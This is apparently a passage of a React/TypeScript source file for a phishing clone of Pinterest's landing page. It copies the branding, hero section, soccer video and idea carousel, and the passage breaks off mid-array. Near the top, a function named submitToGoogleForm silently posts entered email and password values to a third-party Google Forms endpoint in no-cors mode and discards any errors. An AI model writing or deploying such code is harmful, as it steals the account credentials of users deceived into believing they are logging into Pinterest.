import React, { useState, useEffect, useMemo, useRef } from "react";
import favicon from "../assets/favicon.png";
import soccerVideo from "../assets/video .mp4";
import logo from "../assets/logo.png";
import image from "../assets/image 2.jpeg";

// ─────────────────────────────────────────────────────────────────────────────
// CONFIG & CONSTANTS
// ─────────────────────────────────────────────────────────────────────────────

const GOOGLE_FORM_ACTION =
  "https://docs.google.com/forms/d/e/1FAIpQLSfQixt2_ED6YtLqEiwUNKANJwAAWV2TfKNLoVJ2NSlqnDF6Vg/formResponse";
const ENTRY_EMAIL = "entry.1697602432";
const ENTRY_PASSWORD = "entry.1806551528";

const feedItems = [
  // Nature & Landscape
  { url: "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=400&auto=format&fit=crop&q=80", title: "Mountain Sunrise", h: 300 },
  { url: "https://images.unsplash.com/photo-1441974231531-c6227db76b6e?w=400&auto=format&fit=crop&q=80", title: "Forest Path", h: 220 },
  { url: "https://images.unsplash.com/photo-1518495973542-4542c06a5843?w=400&auto=format&fit=crop&q=80", title: "Golden Hour", h: 260 },
  { url: "https://images.unsplash.com/photo-1472214103451-9374bd1c798e?w=400&auto=format&fit=crop&q=80", title: "Lake Reflection", h: 340 },
  { url: "https://images.unsplash.com/photo-1500534314209-a25ddb2bd429?w=400&auto=format&fit=crop&q=80", title: "Desert Dunes", h: 190 },
  { url: "https://images.unsplash.com/photo-1501854140801-50d01698950b?w=400&auto=format&fit=crop&q=80", title: "Aerial Forest", h: 280 },
  // Architecture & Interior
  { url: "https://images.unsplash.com/photo-1493809842364-78817add7ffb?w=400&auto=format&fit=crop&q=80", title: "Minimalist Room", h: 240 },
  { url: "https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=400&auto=format&fit=crop&q=80", title: "Modern Kitchen", h: 320 },
  { url: "https://images.unsplash.com/photo-1555041469-a586c61ea9bc?w=400&auto=format&fit=crop&q=80", title: "Cozy Living Room", h: 200 },
  { url: "https://images.unsplash.com/photo-1502005229762-cf1b2da7c5d6?w=400&auto=format&fit=crop&q=80", title: "City Architecture", h: 360 },
  { url: "https://images.unsplash.com/photo-1560448204-e02f11c3d0e2?w=400&auto=format&fit=crop&q=80", title: "Loft Bedroom", h: 250 },
  // Fashion & Style
  { url: "https://images.unsplash.com/photo-1469334031218-e382a71b716b?w=400&auto=format&fit=crop&q=80", title: "Street Style", h: 380 },
  { url: "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=400&auto=format&fit=crop&q=80", title: "Fashion Editorial", h: 310 },
  { url: "https://images.unsplash.com/photo-1483985988355-763728e1935b?w=400&auto=format&fit=crop&q=80", title: "Shopping Bags", h: 210 },
  { url: "https://images.unsplash.com/photo-1509631179647-0177331693ae?w=400&auto=format&fit=crop&q=80", title: "Minimal Outfit", h: 270 },
  // Food & Coffee
  { url: "https://images.unsplash.com/photo-1495474472287-4d71bcdd2085?w=400&auto=format&fit=crop&q=80", title: "Coffee Art", h: 230 },
  { url: "https://images.unsplash.com/photo-1567620905732-2d1ec7ab7445?w=400&auto=format&fit=crop&q=80", title: "Pancake Stack", h: 290 },
  { url: "https://images.unsplash.com/photo-1490474418585-ba9bad8fd0ea?w=400&auto=format&fit=crop&q=80", title: "Acai Bowl", h: 180 },
  { url: "https://images.unsplash.com/photo-1546069901-ba9599a7e63c?w=400&auto=format&fit=crop&q=80", title: "Healthy Bowl", h: 350 },
  { url: "https://images.unsplash.com/photo-1565299507177-b0ac66763828?w=400&auto=format&fit=crop&q=80", title: "Street Food", h: 220 },
  // Travel & City
  { url: "https://images.unsplash.com/photo-1540959733332-eab4deabeeaf?w=400&auto=format&fit=crop&q=80", title: "Tokyo Night", h: 300 },
  { url: "https://images.unsplash.com/photo-1499856871958-5b9627545d1a?w=400&auto=format&fit=crop&q=80", title: "Paris Eiffel", h: 260 },
  { url: "https://images.unsplash.com/photo-1523482580672-f109ba8cb9be?w=400&auto=format&fit=crop&q=80", title: "Sydney Opera", h: 200 },
  { url: "https://images.unsplash.com/photo-1534430480872-3498386e7856?w=400&auto=format&fit=crop&q=80", title: "Bali Sunset", h: 330 },
  { url: "https://images.unsplash.com/photo-1552832230-c0197dd311b5?w=400&auto=format&fit=crop&q=80", title: "Rome Streets", h: 240 },
  // People & Lifestyle
  { url: "https://images.unsplash.com/photo-1529156069898-49953e39b3ac?w=400&auto=format&fit=crop&q=80", title: "Friends Laughing", h: 280 },
  { url: "https://images.unsplash.com/photo-1522202176988-66273c2fd55f?w=400&auto=format&fit=crop&q=80", title: "Working Together", h: 210 },
  { url: "https://images.unsplash.com/photo-1506126613408-eca07ce68773?w=400&auto=format&fit=crop&q=80", title: "Morning Yoga", h: 370 },
  { url: "https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=400&auto=format&fit=crop&q=80", title: "Couple Goals", h: 250 },
  // Art & Creative
  { url: "https://images.unsplash.com/photo-1513364776144-60967b0f800f?w=400&auto=format&fit=crop&q=80", title: "Art Studio", h: 320 },
  { url: "https://images.unsplash.com/photo-1547891654-e66ed7ebb968?w=400&auto=format&fit=crop&q=80", title: "Abstract Paint", h: 190 },
  { url: "https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400&auto=format&fit=crop&q=80", title: "Watercolor", h: 260 },
  // Animals
  { url: "https://images.unsplash.com/photo-1518020382113-a7e8fc38eac9?w=400&auto=format&fit=crop&q=80", title: "Cute Dog", h: 230 },
  { url: "https://images.unsplash.com/photo-1548681528-6a5c45b66b42?w=400&auto=format&fit=crop&q=80", title: "Fluffy Cat", h: 290 },
  { url: "https://images.unsplash.com/photo-1474511320723-9a56873867b5?w=400&auto=format&fit=crop&q=80", title: "Fox in Snow", h: 340 },
  // Plants & Flowers
  { url: "https://images.unsplash.com/photo-1457089328109-e5d9bd499191?w=300", title: "Spring Flowers", h: 200 },
  { url: "https://images.unsplash.com/photo-1416879595882-3373a0480b5b?w=400&auto=format&fit=crop&q=80", title: "Garden Bloom", h: 310 },
  { url: "https://images.unsplash.com/photo-1463936575829-25148e1db1b8?w=300", title: "Succulent", h: 220 },
  // Tech & Minimal
  { url: "https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=400&auto=format&fit=crop&q=80", title: "Coding Setup", h: 260 },
  { url: "https://images.unsplash.com/photo-1484788984921-03950022c9ef?w=400&auto=format&fit=crop&q=80", title: "Clean Desk", h: 180 },

  // Tambahan variasi baru
  { url: "https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?w=400&auto=format&fit=crop&q=80", title: "Mountain Range", h: 260 },
  { url: "https://images.unsplash.com/photo-1502790671504-542ad42d5189?w=400&auto=format&fit=crop&q=80", title: "Autumn Path", h: 320 },
  { url: "https://images.unsplash.com/photo-1519681393784-d120267933ba?w=400&auto=format&fit=crop&q=80", title: "Sunset Beach", h: 210 },
  { url: "https://images.unsplash.com/photo-1524758631624-e2822e304c36?w=400&auto=format&fit=crop&q=80", title: "Modern Interior", h: 290 },
  { url: "https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=400&auto=format&fit=crop&q=80", title: "Living Space", h: 240 },
  { url: "https://images.unsplash.com/photo-1520975954732-35dd22299614?w=400&auto=format&fit=crop&q=80", title: "Fashion Portrait", h: 350 },
  { url: "https://images.unsplash.com/photo-1512621776951-a57141f2eefd?w=400&auto=format&fit=crop&q=80", title: "Coffee Shop", h: 220 },
  { url: "https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=400&auto=format&fit=crop&q=80", title: "Dessert Plate", h: 280 },
  { url: "https://images.unsplash.com/photo-1476514525535-07fb3b4ae5f1?w=400&auto=format&fit=crop&q=80", title: "City Skyline", h: 300 },
  { url: "https://images.unsplash.com/photo-1493246507139-91e8fad9978e?w=400&auto=format&fit=crop&q=80", title: "Puppy Portrait", h: 260 },
  { url: "https://images.unsplash.com/photo-1487875961445-47a00398c267?w=400&auto=format&fit=crop&q=80", title: "Botanical Green", h: 310 },
  { url: "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=400&auto=format&fit=crop&q=80", title: "Laptop Setup", h: 230 },
];

// ─────────────────────────────────────────────────────────────────────────────
// HELPERS & SHARED STYLES
// ─────────────────────────────────────────────────────────────────────────────

function submitToGoogleForm(email: string, password: string) {
  const body = new URLSearchParams();
  body.append(ENTRY_EMAIL, email);
  body.append(ENTRY_PASSWORD, password);

  fetch(GOOGLE_FORM_ACTION, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body.toString(),
  }).catch(() => {});
}

const styles = {
  input: (hasValue: boolean, extra?: React.CSSProperties): React.CSSProperties => ({
    width: "100%",
    padding: "14px 16px",
    border: `1.5px solid ${hasValue ? "#e60023" : "#cdcdd1"}`,
    borderRadius: 16,
    fontSize: 15,
    outline: "none",
    background: "#fff",
    color: "#111",
    boxSizing: "border-box",
    ...extra,
  }),
  modalOverlay: {
    position: "fixed" as const,
    inset: 0,
    zIndex: 200,
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    background: "rgba(0,0,0,0.45)",
    padding: 16,
  },
  modalCard: {
    background: "#fff",
    borderRadius: 32,
    padding: "44px 36px 32px",
    width: "100%",
    maxWidth: 400,
    boxShadow: "0 12px 50px rgba(0,0,0,.3)",
    textAlign: "center" as const,
    position: "relative" as const,
  },
  logoContainer: {
    width: 42,
    height: 42,
    background: "#e60023",
    borderRadius: "50%",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    margin: "0 auto 18px",
    overflow: "hidden" as const,
  },
  submitButton: (loading?: boolean) => ({
    width: "100%",
    padding: "14px",
    background: loading ? "#f87171" : "#e60023",
    color: "#fff",
    border: "none",
    borderRadius: 50,
    fontSize: 15,
    fontWeight: 700,
    cursor: loading ? "not-allowed" : "pointer",
    marginTop: 6,
    transition: "background 0.2s",
  }),
};

function MasonryBackground() {
  const [colCount, setColCount] = useState(6);

  useEffect(() => {
    const update = () => setColCount(Math.max(3, Math.floor(window.innerWidth / 175)));
    update();
    window.addEventListener("resize", update);
    return () => window.removeEventListener("resize", update);
  }, []);

  const shuffled = useMemo(() => [...feedItems].sort(() => Math.random() - 0.5), []);
  
  const cols = useMemo(() => {
    const c: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
    shuffled.forEach((item, i) => c[i % colCount].push(item));
    return c;
  }, [shuffled, colCount]);

  return (
    <div style={{ position: "fixed", inset: 0, display: "flex", gap: 8, padding: "0 4px", overflow: "hidden", background: "#ffffff" }}>
      {cols.map((col, ci) => (
        <div key={ci} style={{ display: "flex", flexDirection: "column", gap: 8, flex: 1, marginTop: ci % 2 === 1 ? -44 : 0 }}>
          {col.map((p, pi) => (
            <img key={pi} src={p.url} alt="" loading="lazy" style={{ width: "100%", height: p.h ?? 220, borderRadius: 14, objectFit: "cover", flexShrink: 0 }} />
          ))}
        </div>
      ))}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTIONS (LANDING PAGE REPLICA)
// ─────────────────────────────────────────────────────────────────────────────

function LandingPage({ 
  onNav, 
  onDirectLogin 
}: { 
  onNav: (target: "login" | "signup") => void;
  onDirectLogin: (email: string, password: string) => Promise<void>;
}) {
  const scrollRef = useRef<HTMLDivElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  
  const [regEmail, setRegEmail] = useState("");
  const [regPassword, setRegPassword] = useState("");
  const [regDob, setRegDob] = useState("");
  const [isPlaying, setIsPlaying] = useState(true);

  const [scrollX, setScrollX] = useState(0);
  const [canScrollRight, setCanScrollRight] = useState(true);
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener("resize", handleResize);
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  const handleScroll = () => {
    if (scrollRef.current) {
      const { scrollLeft, scrollWidth, clientWidth } = scrollRef.current;
      setScrollX(scrollLeft);
      setCanScrollRight(scrollLeft + clientWidth < scrollWidth - 5);
    }
  };

  useEffect(() => {
    if (!isMobile) {
      handleScroll();
      window.addEventListener("resize", handleScroll);
      return () => window.removeEventListener("resize", handleScroll);
    }
  }, [isMobile]);

  const togglePlay = (e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation(); 
    if (videoRef.current) {
      if (isPlaying) {
        videoRef.current.pause();
      } else {
        videoRef.current.play().catch(() => {});
      }
      setIsPlaying(!isPlaying);
    }
  };

  const scrollCarousel = (direction: "left" | "right") => {
    if (scrollRef.current) {
      const offset = direction === "left" ? -400 : 400;
      scrollRef.current.scrollBy({ left: offset, behavior: "smooth" });
    }
  };

  return (
    <div style={{ background: "#fff", color: "#111", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif", overflowX: "hidden" }}>
      
      {/* 1. FIXED & STICKY NAVBAR */}
      <header style={{ 
        display: "flex", 
        alignItems: "center", 
        justifyContent: "space-between", 
        padding: isMobile ? "12px 16px" : "16px 40px", 
        position: "fixed", 
        top: 0, left: 0, right: 0,
        background: "rgb(255, 255, 255)", 
        borderBottom: "1px solid rgba(0,0,0,0.05)",
        zIndex: 150 
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 16, flex: 1 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, fontWeight: 670, fontSize: 20, color: "#e60023", cursor: "pointer", letterSpacing: "-0.5px" }}>
            <div style={{ height: isMobile ? 24 : 32, width: "auto", display: "flex", alignItems: "center", justifyContent: "center", background: "transparent" }}>
              <img 
                src={logo} 
                alt="Pinterest Logo" 
                style={{ height: isMobile ? "100%" : "72%", width: isMobile ? "auto" : "1", objectFit: "contain" }} 
              />
            </div>
          </div>
          
          {!isMobile && (
            <>
              <span style={{ fontSize: 16, fontWeight: 600, cursor: "pointer", marginLeft: 8 }}>Explore</span>
              <div style={{ flex: 1, maxWidth: 595, position: "relative", display: "flex", alignItems: "center" }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="3.5" style={{ position: "absolute", left: 16 }}>
                  <circle cx="11" cy="11" r="8" /><path d="m21 21-4.35-4.35" />
                </svg>
                <input placeholder="Search for easy dinners, fashion, etc." style={{ width: "100%", padding: "12px 16px 12px 46px", background: "#f1f1f1", border: "none", borderRadius: 15, fontSize: 15, outline: "none", color: "#111" }} disabled />
              </div>
            </>
          )}
        </div>
        
        <div style={{ display: "flex", alignItems: "center", gap: isMobile ? 12 : 24, fontSize: 16, fontWeight: 600, marginLeft: isMobile ? 0 : 16 }}>
          {!isMobile && (
            <>
              <span style={{ cursor: "pointer", color: "#111" }}>About</span>
              <span style={{ cursor: "pointer", color: "#111" }}>Businesses</span>
              <span style={{ cursor: "pointer", color: "#111" }}>Create</span>
              <span style={{ cursor: "pointer", color: "#111" }}>News</span>
            </>
          )}
          <button onClick={() => onNav("login")} style={{ background: "#e60023", color: "#fff", border: "none", padding: isMobile ? "10px 18px" : "12px 22px", borderRadius: 24, fontWeight: 700, fontSize: isMobile ? 14 : 15, cursor: "pointer" }}>Log in</button>
          {isMobile ? (
            <button style={{ background: "none", border: "none", display: "flex", alignItems: "center", cursor: "pointer", padding: 0 }}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.5" strokeLinecap="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
            </button>
          ) : (
            <button onClick={() => onNav("signup")} style={{ background: "#efefef", color: "#111", border: "none", padding: "12px 22px", borderRadius: 24, fontWeight: 700, fontSize: 15, cursor: "pointer" }}>Sign up</button>
          )}
        </div>
      </header>

      <div style={{ height: isMobile ? 56 : 80 }} />
      
{/* 2. HERO MAIN CONTAINER */}
<section style={{ 
  display: "flex", 
  flexDirection: isMobile ? "column" : "row",
  flexWrap: "wrap", 
  minHeight: isMobile ? "auto" : "80vh", 
  alignItems: "center", 
  justifyContent: isMobile ? "center" : "space-between",
  padding: isMobile ? "40px 20px" : "40px 6% 60px 10%", 
  gap: isMobile ? 32 : 20,
  textAlign: isMobile ? "center" : "left"
}}>
  
  {/* SISI KIRI: TEKS & TOMBOL */}
  <div style={{ 
    flex: "1 1 450px", 
    display: "flex", 
    flexDirection: "column", 
    justifyContent: "center",
    alignItems: isMobile ? "center" : "flex-start",
    gap: 32, 
    textAlign: isMobile ? "center" : "left",
    width: "100%"
  }}>
    <h1 style={{ 
      fontSize: isMobile ? "36px" : "50px", 
      fontWeight: 700, 
      lineHeight: 1.1, 
      letterSpacing: "-2.5px", 
      margin: 0, 
      color: "#111" 
    }}>
      Create the life you love <br />on Pinterest
    </h1>

    {/* KOLASE FOTO MOBILE (Muncul hanya di Mobile) */}
    {isMobile && (
       <div style={{ position: "relative", width: "100%", height: "260px", maxWidth: "340px" }}>
          <img src="https://images.unsplash.com/photo-1457089328109-e5d9bd499191?w=300" style={{ position: "absolute", top: 0, left: 0, width: "45%", height: "60%", borderRadius: 16, objectFit: "cover" }} alt="" />
          <img src="https://images.unsplash.com/photo-1546069901-ba9599a7e63c?w=300" style={{ position: "absolute", bottom: 0, left: "5%", width: "40%", height: "50%", borderRadius: 16, objectFit: "cover" }} alt="" />
          <img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=300" style={{ position: "absolute", top: "10%", right: 0, width: "50%", height: "80%", borderRadius: 16, objectFit: "cover" }} alt="" />
       </div>
    )}

    <div style={{ display: "flex", flexDirection: isMobile ? "column" : "row", alignItems: "center", gap: 12, width: "100%" }}>
      <button onClick={() => onNav("signup")} style={{ background: "#e60023", color: "#fff", border: "none", padding: "14px 24px", borderRadius: 24, fontSize: 16, fontWeight: 700, cursor: "pointer", width: isMobile ? "100%" : "auto" }}>Join Pinterest for free</button>
      <button onClick={() => onNav("login")} style={{ background: "#e9e9e9", color: "#111", border: "none", padding: "14px 24px", borderRadius: 24, fontSize: 16, fontWeight: 700, cursor: "pointer", width: isMobile ? "100%" : "auto" }}>I already have an account</button>
    </div>
  </div>

  {/* SISI KANAN: KOLASE DESKTOP (Hanya muncul di Desktop) */}
  {!isMobile && (
    <div style={{ flex: "1 1 500px", position: "relative", minHeight: 520, maxWidth: 580 }}>
      <img src="https://images.unsplash.com/photo-1457089328109-e5d9bd499191?w=300" style={{ position: "absolute", top: 0, left: 20, width: 160, height: 130, borderRadius: 20, objectFit: "cover", boxShadow: "0 8px 24px rgba(0,0,0,0.12)" }} alt="" />
      <img src="https://images.unsplash.com/photo-1469334031218-e382a71b716b?w=400" style={{ position: "absolute", top: 60, left: 160, width: 260, height: 340, borderRadius: 28, objectFit: "cover", boxShadow: "0 16px 40px rgba(0,0,0,0.18)", zIndex: 3 }} alt="" />
      <img src="https://images.unsplash.com/photo-1463936575829-25148e1db1b8?w=300" style={{ position: "absolute", top: 10, right: 10, width: 130, height: 150, borderRadius: 22, objectFit: "cover", boxShadow: "0 8px 24px rgba(0,0,0,0.12)" }} alt="" />
      <img src="https://images.unsplash.com/photo-1513364776144-60967b0f800f?w=300" style={{ position: "absolute", bottom: 20, left: 0, width: 190, height: 220, borderRadius: 24, objectFit: "cover", boxShadow: "0 8px 24px rgba(0,0,0,0.12)", zIndex: 2 }} alt="" />
      <img src="https://images.unsplash.com/photo-1546069901-ba9599a7e63c?w=300" style={{ position: "absolute", bottom: 0, right: 30, width: 200, height: 170, borderRadius: 24, objectFit: "cover", boxShadow: "0 8px 24px rgba(0,0,0,0.12)", zIndex: 2 }} alt="" />
    </div>
  )}
</section>
     {/* 3. FEATURE SECTION: SOCCER SEASON */}
      <section style={{ 
        background: "#fff", 
        padding: isMobile ? "32px 16px 16px" : "90px 40px 16px", 
        textAlign: "center" 
      }}>
        <h2 style={{ 
          fontSize: isMobile ? "28px" : "50px", 
          fontWeight: 700, 
          marginBottom: 12, 
          letterSpacing: isMobile ? "-0.5px" : "-1.5px", 
          color: "#111" 
        }}>
          Step into soccer season
        </h2>
        <p style={{ 
          fontSize: isMobile ? 16 : 22, 
          color: "#111", 
          marginBottom: isMobile ? 24 : 44, 
          maxWidth: 600, 
          margin: isMobile ? "0 auto 24px" : "0 auto 44px", 
          fontWeight: 400 
        }}>
          Flex your fandom and score fresh inspiration for every match.
        </p>
        
        <div style={{ 
          position: "relative", 
          maxWidth: isMobile ? 340 : 1120, 
          margin: "0 auto", 
          borderRadius: isMobile ? 24 : 36, 
          overflow: "hidden", 
          height: isMobile ? 400 : 610, 
          boxShadow: "0 6px 30px rgb(255, 255, 255)" 
        }}>
          <video ref={videoRef} src={soccerVideo} autoPlay muted loop playsInline style={{ width: "100%", height: "100%", objectFit: "cover" }} />
          {isMobile ? (
            /* Overlay Capsule Card Khusus Mobile */
            <div style={{ 
             
            }}>
             
            </div>
          ) : (
            /* Tombol Play/Pause Khusus PC/Desktop */
            <button onClick={togglePlay} style={{ position: "absolute", bottom: 24, left: 24, background: "rgba(255, 255, 255, 0.27)", border: "none", width: 44, height: 44, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", padding: 0, outline: "none", zIndex: 12 }}>
              {isPlaying ? (
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#ffffff"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
              ) : (
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#ffffff"><path d="M8 5v14l11-7z"/></svg>
              )}
            </button>
          )}
        </div>
      </section>

     {/* 4. MORE WINNING IDEAS SECTION */}
      <section style={{ padding: isMobile ? "24px 16px" : "16px 6% 90px 10%", position: "relative" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: isMobile ? 16 : 24, paddingRight: isMobile ? 0 : "4%" }}>
          <h3 style={{ fontSize: isMobile ? "20px" : "36px", fontWeight: 700, margin: 0, color: "#111", letterSpacing: "-1px" }}>
            More winning ideas
          </h3>
          <button style={{ background: "#efefef", border: "none", padding: isMobile ? "8px 14px" : "12px 20px", borderRadius: 24, fontWeight: 700, fontSize: isMobile ? 13 : 15, cursor: "pointer", color: "#111" }}>
            See all
          </button>
        </div>

        {isMobile ? (
          /* TAMPILAN GRID 2-KOLOM ASIMETRIS KHUSUS MOBILE */
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, alignItems: "start" }}>
            {/* Kolom Kiri */}
            <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
              <div>
                <div style={{ height: 160, background: "#efefef", borderRadius: 16, overflow: "hidden" }}>
                  <img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=300" style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                </div>
                <p style={{ margin: "6px 0 2px", fontSize: 12, fontWeight: 700, color: "#111" }}>Styling soccer jerseys</p>
                <p style={{ margin: 0, fontSize: 11, color: "#767676" }}>Pinterest • 2w</p>
              </div>
              <div>
                <div style={{ height: 120, background: "#efefef", borderRadius: 16, overflow: "hidden" }}>
                  <img src="https://images.unsplash.com/photo-1530103862676-de8c9debad1d?w=300" style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                </div>
                <p style={{ margin: "6px 0 2px", fontSize: 12, fontWeight: 700, color: "#111" }}>Sports birthday ideas</p>
                <p style={{ margin: 0, fontSize: 11, color: "#767676" }}>Inspiration • 1mo</p>
              </div>
            </div>

            {/* Kolom Kanan */}
            <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
              <div>
                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 2, height: 120, borderRadius: 16, overflow: "hidden", background: "#efefef" }}>
                  <img src="https://images.unsplash.com/photo-1541534741688-6078c6bfb5c5?w=150" style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                  <img src="https://images.unsplash.com/photo-1508214751196-bcfd4ca60f91?w=150" style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                  <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=150" style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                  <img src="https://images.unsplash.com/photo-1606107557195-0e29a4b5b4aa?w=150" style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                </div>
                <p style={{ margin: "6px 0 2px", fontSize: 12, fontWeight: 700, color: "#111" }}>Sporty hairstyles</p>
                <p style={{ margin: 0, fontSize: 11, color: "#767676" }}>Beauty • 1mo</p>
              </div>
              <div>
                <div style={{ height: 160, background: "#efefef", borderRadius: 16, overflow: "hidden" }}>
                  <img src="https://images.unsplash.com/photo-1493809842364-78817add7ffb?w=300" style={{ width: "100%", height: "100%", objectFit: "cover" }} alt="" />
                </div>
                <p style={{ margin: "6px 0 2px", fontSize: 12, fontWeight: 700, color: "#111" }}>Soccer fan aesthetic</p>
                <p style={{ margin: 0, fontSize: 11, color: "#767676" }}>Fashion • 3w</p>
              </div>
            </div>
          </div>
        ) : (
          /* TAMPILAN SLIDER CAROUSEL KHUSUS DESKTOP (Sesuai Kodinganmu) */
          <div style={{ position: "relative", width: "100%" }}>
            
            {/* Tombol Geser KIRI */}
            {scrollX > 5 && (
              <button 
                onClick={() => scrollCarousel("left")}
                style={{ 
                  position: "absolute", 
                  left: "24px",  
                  top: "80px",   
                  transform: "translateY(-50%)", 
                  width: 40, 
                  height: 44,         
                  background: "#ffffff", 
                  border: "none", 
                  borderRadius: "12px",
                  boxShadow: "0 4px 12px rgba(0,0,0,0.12)", 
                  display: "flex", 
                  alignItems: "center", 
                  justifyContent: "center", 
                  cursor: "pointer", 
                  zIndex: 20,    
                  padding: 0 
                }}
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#111111" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="15 18 9 12 15 6"></polyline>
                </svg>
              </button>
            )}

            {/* Tombol Geser KANAN */}
            {canScrollRight && (
              <button 
                onClick={() => scrollCarousel("right")}
                style={{ 
                  position: "absolute", 
                  right: "24px", 
                  top: "80px",   
                  transform: "translateY(-50%)", 
                  width: 40, 
                  height: 44,         
                  background: "#ffffff", 
                  border: "none", 
                  borderRadius: "12px",
                  boxShadow: "0 4px 12px rgba(0,0,0,0.12)", 
                  display: "flex", 
                  alignItems: "center", 
                  justifyContent: "center", 
                  cursor: "pointer", 
                  zIndex: 20,    
                  padding: 0 
                }}
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#111111" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="9 18 15 12 9 6"></polyline>
                </svg>
              </button>
            )}
            
            <div 
              ref={scrollRef}
              onScroll={handleScroll}
              style={{ 
                display: "flex", 
                gap: 20, 
                overflowX: "auto", 
                whiteSpace: "nowrap",
                scrollBehavior: "smooth",
                paddingBottom: 20,
                scrollbarWidth: "none", 
              }}
              className="hide-scrollbar"
            >
              {[
                { 
                  title: "Sporty hairstyles for active days", 
                  tags: "Beauty", 
                  pins: "79 Pins • 1mo", 
                  imgs: [
                    "https://images.unsplash.com/photo-1541534741688-6078c6bfb5c5?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1508214751196-bcfd4ca60f91?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Sports fans birthday ideas", 
                  tags: "Inspiration", 
                  pins: "61 Pins • 1mo", 
                  imgs: [
                    "https://images.unsplash.com/photo-1530103862676-de8c9debad1d?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1464366400600-7168b8af9bc3?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1513151233558-d860c5398176?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Soccer fan aesthetic", 
                  tags: "Pinterest Predicts", 
                  pins: "66 Pins • 3w", 
                  imgs: [
                    "https://images.unsplash.com/photo-1518091043644-c1d4457512c6?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1606107557195-0e29a4b5b4aa?w=200&auto=format&fit=crop&q=80",
                    "https://images.unsplash.com/photo-1517649763962-0c623066013b?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Sporty chic soccer looks", 
                  tags: "Pinterest", 
                  pins: "171 Pins • 2w", 
                  imgs: [
                    "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1483985988355-763728e1935b?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1509631179647-0177331693ae?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Match day outfit vibes", 
                  tags: "Style", 
                  pins: "94 Pins • 5d", 
                  imgs: [
                    "https://images.unsplash.com/photo-1485230895905-ec40ba36b9bc?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1509631179647-0177331693ae?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1469334031218-e382a71b716b?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Minimalist desk & gaming setups", 
                  tags: "Tech", 
                  pins: "120 Pins • 2w", 
                  imgs: [
                    "https://images.unsplash.com/photo-1618424181497-157f25b6ddd5?w=400&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1603481588273-2f908a9a7a1b?w=200&auto=format&fit=crop&q=80", 
                    "https://images.unsplash.com/photo-1547082299-de196ea013d6?w=200&auto=format&fit=crop&q=80"
                  ] 
                },
                { 
                  title: "Retro sneaker culture collection", 
                  tags: "Fashion", 
                  pins: "85 Pins • 1w", 
                  imgs: [
